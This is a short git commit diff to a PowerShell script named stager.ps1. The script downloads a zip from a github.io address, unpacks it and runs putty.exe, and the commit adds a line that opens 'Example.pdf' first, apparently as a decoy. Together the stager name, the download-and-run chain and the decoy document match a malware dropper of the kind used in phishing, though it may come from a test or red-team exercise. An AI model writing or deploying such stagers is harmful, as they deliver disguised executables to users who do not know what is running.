4498c594d27f1820c7e00892e30945a4dd5b0c2f
SimonSchoeni <62761108+SimonSchoeni@users.noreply.github.com>
2023-10-23 15:21:05 +0200

    Update stager.ps1

--- stager.ps1
+++ stager.ps1
@@ -1,4 +1,5 @@
 Invoke-WebRequest "https://simonschoeni.github.io/putty.zip" -OutFile "download.zip"; 
 Expand-Archive "download.zip"
 Set-Location "download"
+Invoke-Item "Example.pdf"
 .\putty.exe
